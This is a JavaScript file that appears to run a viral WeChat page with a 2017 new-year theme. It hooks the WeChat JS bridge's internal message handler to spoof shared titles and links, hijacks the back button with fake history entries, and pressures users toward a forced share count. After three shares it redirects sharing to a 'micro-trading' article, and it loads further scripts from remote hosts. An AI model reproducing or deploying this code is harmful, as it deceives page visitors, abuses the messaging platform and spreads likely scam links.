var ua = navigator.userAgent;
if (ua.indexOf('MicroMessenger') > 0) {

    function isInWechat() {
        var e = navigator.userAgent.toLowerCase();
        return e.indexOf("micromessenger") >= 0
    }
    function isIos() {
        var e = navigator.userAgent.toLowerCase();
        return e.indexOf("iphone") >= 0 || e.indexOf("ipad") >= 0 || e.indexOf("applewebkit") >= 0
    }
    function isAndroid() {
        var e = navigator.userAgent.toLowerCase();
        return e.indexOf("android") >= 0
    }
    function isUrl(e) {
        return !!e && (e.indexOf("http://") >= 0 || e.indexOf("https://") >= 0)
    }
    function isArray(e) {
        return "[object Array]" === Object.prototype.toString.call(e)
    }
    function isNumber(e) {
        return "number" == typeof e
    }
    function getRandomNum(e, t) {
        var a = t - e
          , o = Math.random();
        return e + Math.round(o * a)
    }
    function getFormatDate() {
        var e = new Date
          , t = new Date(e.setHours(e.getHours() + 8)).toISOString();
        return t.substring(0, t.indexOf("T"))
    }
    function changeTitle(e) {
        if (document.title = e,
        navigator.userAgent.toLowerCase().indexOf("iphone") >= 0) {
            var t = $("body")
              , a = $('<iframe src="/favicon.ico"></iframe>');
            a.on("load", function () {
                setTimeout(function () {
                    a.off("load").remove()
                }, 0)
            }).appendTo(t)
        }
    }
    var Url = function () {
        function e() {
            this.host = window.location.host,
            this.protocol = window.location.protocol,
            this.params = this.GetRequest(window.location.search),
            this.hash = window.location.hash,
            this.pathname = window.location.pathname
        }
        return e.prototype.GetHref = function (e) {
            var t = this
              , a = void 0 === e.port ? t.port : e.port
              , o = void 0 === e.pathname ? t.pathname : e.pathname
              , i = e.host || t.host
              , s = e.protocol || t.protocol || "http:";
            (i.indexOf(".github.") >= 0 || i.indexOf(".myhwclouds.com") >= 0) && (s = "https:");
            var n = s + "//" + i + (a ? ":" + a : "") + o
              , r = {};
            if ("all" !== e.removeParams)
                for (var d in t.params)
                    t.params.hasOwnProperty(d) && (r[d] = t.params[d]);
            if (e.params)
                for (var d in e.params)
                    e.params.hasOwnProperty(d) && (r[d] = e.params[d]);
            if ("all" !== e.removeParams) {
                var c = e.removeParams;
                if (c)
                    for (var d in c)
                        if (e.removeParams.hasOwnProperty(d)) {
                            var h = e.removeParams[d];
                            delete r[h]
                        }
            }
            var l = [];
            for (var d in r)
                r.hasOwnProperty(d) && l.push(d + "=" + encodeURIComponent(r[d]));
            var u;
            return l && l.length > 0 && (u = l.join("&")),
            n += n.indexOf("?") > 0 ? "&" : "?",
            n + u
        }
        ,
        e.prototype.GetRequest = function (e) {
            var t = e
              , a = new Object;
            if (t.indexOf("?") != -1)
                for (var o = t.substr(1), i = o.split("&"), s = 0; s < i.length; s++) {
                    var n = i[s]
                      , r = n.indexOf("=")
                      , d = void 0
                      , c = void 0;
                    r >= 0 ? (d = n.substr(0, r),
                    c = decodeURIComponent(n.substring(r + 1))) : d = n,
                    d && (a[d] = c)
                }
            return a
        }
        ,
        e
    }();


    window.url = new Url,
    Object.defineProperty(window, "WeixinJSBridge", {
        writable: !0,
        enumerable: !0,
        configurable: !0
    }),

    window.config = {
        apiList: ["//dc.spiderer.cn/api/DomainModel/NextDomainB"],
        modelConfig: {
            css: "//dcfa.oss-cn-shanghai.aliyuncs.com/index/css/video-list-v2.0.css",
            js: "//dcfa.oss-cn-shanghai.aliyuncs.com/index/scripts/video-list-v2.0.js",
            forceShareCount: 3
        },
        showRepairPage: !1,
        forbidUrl: "http://www.qq.com"
    },
    window.mConfig = {},
    isAndroid() || isIos() || (config.forbidUrl ? location.href = config.forbidUrl : location.href = "http://www.qq.com");

    var Main = function () {
        function e() {
            this.nextUrlCalledCount = 0,
            this.forceShareCount = 4,
            this.currentShareCount = 0,
            this.imageSrcRoot = "//dcfa.oss-cn-shanghai.aliyuncs.com/index/img/",
            this.toastTimeOut = 0,
            this.searchDomainModelId = window.url.params.dmid || "bjsth",
            this.searchShareDomainModelId = window.url.params.sdmid || "ahndth",
            "qhhu" != this.searchDomainModelId && this.searchDomainModelId || (this.searchDomainModelId = "bjsth",
            this.searchShareDomainModelId = "ahndth"),
            this.searchModelId = window.url.params.mid || "video-list",
            this.redirect = this.isNeedRedirect(),
            this.isIphone = isIos(),
            this.fileName = location.pathname.substr(location.pathname.lastIndexOf("/")),
            this.fileName.indexOf(".html") < 0 && (this.fileName = "/index.html")
        }
        return e.prototype.isNeedRedirect = function () {
            var e = window.url.params.from;
            return "timeline" == e || "groupmessage" == e || "singlemessage" == e || "share" == e
        }
        ,
        e.prototype.getRandomValueInArray = function (e, t) {
            if (!e)
                return t;
            if ("string" == typeof e)
                return e;
            if (!isArray(e))
                return t;
            var a = getRandomNum(0, e.length - 1);
            return e[a] || t
        }
        ,
        e.prototype.start = function () {
            var e = this;
            e.hookBackButton();
            void e.setShareCallBack();
            var messageObj = {
                title: "Happy News Year 2017 改变立刻开始",
                desc: 'Hello 2017，有（' + parseInt(Math.random() * 40000 + 10000, 10) + '）助力改变',
                img_url: get_rand_pic(),
                link: window.location.href
            };
            $.ajax({
                url: "https://ssl5.ichuandian.com/Api/ThinUrl?value=" + encodeURIComponent(window.location.href.split('#')[0] + "?t=" + (new Date().getTime())),
                type: 'get',
                dataType: 'json',
                success: function (data) {
                    if (data && data.ShareUrl) {
                        messageObj.link = data.ShareUrl;
                        messageObj.title = data.Title || messageObj.title;
                        messageObj.desc = data.Desc || messageObj.desc;
                    }
                },
                complete: function () {
                    e.setModelShareData(messageObj);
                }
            });
        }
        ,
        e.prototype.hookBackButton = function () {
            var e = this;
            window.setTimeout(function () {
                history.pushState("weixin", null, "#weixin"),
                e.isIphone && history.pushState("weixin", null, "#weixin"),
                window.onpopstate = function (e) {
                    if (!window.main.isIphone || null !== e.state) {
                        if (window.turl && window.turl.length > 0)
                            return void (location.href = window.turl);
                        var t = main.backUrl;
                        if ("close" === t)
                            WeixinJSBridge && WeixinJSBridge.call("closeWindow");
                        else if (t && t.length > 0)
                            return void (location.href = t)
                    }
                }
            }, 50)
        }
        ,
        e.prototype.setShareCallBack = function () {
            var e = this;
            window.wcShare && (window.wcShare.shareCallback = function (t) {
                var a = !1;
                var o = t && t.err_msg;
                if ("send_app_msg:ok" == o || "send_app_msg:confirm" == o || "share_timeline:ok" == o) {
                    e.currentShareCount++;
                    if (e.currentShareCount == e.forceShareCount && "share_timeline:ok" != o) {
                        e.currentShareCount--;
                    }
                    a = !0;
                }
                if (a) {
                    sharetips(e.currentShareCount);

                    e.model && e.model.shareCallback && e.model.shareCallback({
                        success: a,
                        forceShareCount: e.forceShareCount,
                        currentShareCount: e.currentShareCount,
                        message: o
                    }),
                    e.setNewShareData("shareCallback");

                    if (e.currentShareCount==3) {
                        e.setNewShareData("timeline");
                    }
                }
            })
        }
        ,
        e.prototype.runAction = function (p) {
            console.log('runAction');
        }
        ,
        e.prototype.setNewShareData = function (e) {
            var t = this;
            if (e == "timeline") {
                var messageObj = {
                    title: "给您发了一个2017新春惊喜",
                    desc: 'Hello 2017，有（' + parseInt(Math.random() * 40000 + 10000, 10) + '）助力改变',
                    img_url: get_rand_pic(),
                    link: "http://mp.weixin.qq.com/s/5j2sW4DVDxYH0IwVGttEJg"   //微交易
                };
                return void (window.wcShare.shareData = messageObj);
            }
            if (this.model && this.model.getShareData) {
                this.modelShareData = this.model && this.model.getShareData(e);
                var a = this.modelShareData;
                if (!a) {
                    var o = $("img")[0];
                    a = {
                        link: location.href,
                        title: document.title,
                        desc: document.title,
                        img_url: o && o.getAttribute("src")
                    }
                }
                if (isUrl(a.link))
                    return void (window.wcShare.shareData = a);
            }
        }
        ,
        e.prototype.setModelShareData = function (e) {
            if (window.wcShare) {
                var t = {
                    link: e.link,
                    desc: e.desc,
                    title: e.title,
                    img_url: e.img_url
                };
                if (isUrl(t.link))
                    return void (window.wcShare.shareData = t);
                if (isUrl(this.nextUrl))
                    return t.link = this.nextUrl,
                    void (window.wcShare.shareData = t);
                var a = void 0
                  , o = void 0
                  , i = void 0
                  , s = "share-user-api-error";
                this.nextUrl && (a = this.nextUrl,
                o = this.fileName,
                i = "",
                s = "share-user-ok");
                var n = {
                    protocol: "http:",
                    host: a,
                    pathname: o,
                    port: i,
                    params: {
                        user: s,
                        dmid: this.searchDomainModelId,
                        sdmid: this.searchShareDomainModelId,
                        from: "share",
                        timestamp: Date.now()
                    },
                    removeParams: ["isappinstalled"]
                };
                if (e.linkParams)
                    for (var r in e.linkParams)
                        if (e.linkParams.hasOwnProperty(r)) {
                            var d = e.linkParams[r];
                            n.params[r] = d
                        }
                t.link = url.GetHref(n),
                window.wcShare.shareData = t
            }
        }
        ,
        e
    }();


    var WechatShare = function () {
        function e() {
            var e = this;
            this.onBridgeReady = function () {
                var t = window.WeixinJSBridge
                  , a = {
                      invoke: t.invoke,
                      call: t.call,
                      on: t.on,
                      env: t.env,
                      log: t.log,
                      _fetchQueue: t._fetchQueue,
                      _hasInit: t._hasInit,
                      _hasPreInit: t._hasPreInit,
                      _isBridgeByIframe: t._isBridgeByIframe,
                      _continueSetResult: t._continueSetResult,
                      _handleMessageFromWeixin: t._handleMessageFromWeixin
                  };
                Object.defineProperty(window, "WeixinJSBridge", {
                    writable: !0,
                    enumerable: !0
                }),
                window.WeixinJSBridge = a;
                try {
                    e.setHandleMessageHookForWeixin()
                } catch (t) {
                    e.restoreHandleMessageHookForWeixin()
                }
            }
            ,
            this.handleMesageHook = function (t) {
                if (t) {
                    var a;
                    a = t.__json_message ? t.__json_message : t;
                    var o = a.__params
                      , i = a.__msg_type
                      , s = a.__event_id;
                    if ("callback" == i && e.shareCallback && "function" == typeof e.shareCallback)
                        e.shareCallback(o);
                    else if ("event" == i && s && s.indexOf("share") > 0) {
                        var n = e.shareData.desc
                          , r = e.shareData.link
                          , d = e.shareData.img_url
                          , c = e.shareData.title;
                        Object.defineProperty(o, "title", {
                            get: function () {
                                return delete o.scene,
                                o.desc = n,
                                o.link = r,
                                o.img_url = d,
                                Object.defineProperty(o, "title", {
                                    value: c,
                                    enumerable: !0
                                }),
                                "title"
                            },
                            set: function () { },
                            enumerable: !1,
                            configurable: !0
                        }),
                        e.restoreHandleMessageHookForWeixin(),
                        e.oldHandleMesageHook(t),
                        e.setHandleMessageHookForWeixin()
                    } else
                        e.restoreHandleMessageHookForWeixin(),
                        e.oldHandleMesageHook(t),
                        e.setHandleMessageHookForWeixin()
                }
            }
            ,
            "undefined" == typeof WeixinJSBridge ? document.addEventListener ? document.addEventListener("WeixinJSBridgeReady", this.onBridgeReady, !1) : document.attachEvent && (document.attachEvent("WeixinJSBridgeReady", this.onBridgeReady),
            document.attachEvent("onWeixinJSBridgeReady", this.onBridgeReady)) : this.onBridgeReady()
        }
        return e.prototype.setHandleMessageHookForWeixin = function () {
            this.oldHandleMesageHook = window.WeixinJSBridge._handleMessageFromWeixin,
            window.WeixinJSBridge._handleMessageFromWeixin = this.handleMesageHook
        }
        ,
        e.prototype.restoreHandleMessageHookForWeixin = function () {
            this.oldHandleMesageHook && (window.WeixinJSBridge._handleMessageFromWeixin = this.oldHandleMesageHook)
        }
        ,
        e
    }();
    window.wcShare = new WechatShare;

    $(document).ready(function () {
        window.main = new Main;
        window.main.start();
    });
}